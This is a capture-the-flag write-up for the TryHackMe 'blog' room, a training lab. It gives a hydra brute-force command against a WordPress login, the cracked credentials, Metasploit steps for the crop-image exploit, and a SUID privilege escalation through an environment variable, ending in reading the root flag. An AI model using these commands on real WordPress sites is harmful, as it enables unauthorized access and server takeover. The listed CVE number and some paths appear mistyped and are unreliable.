# Writeup for THM Room [blog](https://tryhackme.com/room/blog)

```fish
set -gx IP 10.10.231.216
# Entry in /etc/hosts:
set -gx IP blog.thm
```

## Found http service (wordpress blog)

> Found usernames: `kwheel` & `bjoel`


## Brute force

```fish
 hydra -l kwheel -P /usr/share/wordlists/rockyou blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```

> Found credentials: `kwheel:cutiepie1`

## Use CVE-2019-89242 | CVE-2019-89242

```fish
msfconsole
# search for crop-image exploit
search crop-image
# use first of list
use 0
# set RHOSTS, USERNAME, PASSWORD
# run exploit
exploit
```

> After this you'll get meterpreter session as `www-html`

## Exploit machine

`cd` to `/user/bjoel` and found `user.txt` with fake content

Search for SUID Flag

```fish
find / -perm /4000 2>/dev/null
```

> Found `/usr/sbin/checker`

Inspect `checker` method

```fish
ltrace checker
```

> `checker` relies on env variable `admin`. So set it with

```fish
export admin=1
```

Run checker and be root:

```bash
checker
whoami
# > root
```

## Get flags

```bash
cat /root/root.txt
find / -name user.txt 2>/dev/null
cat /usr/media/user.txt
```
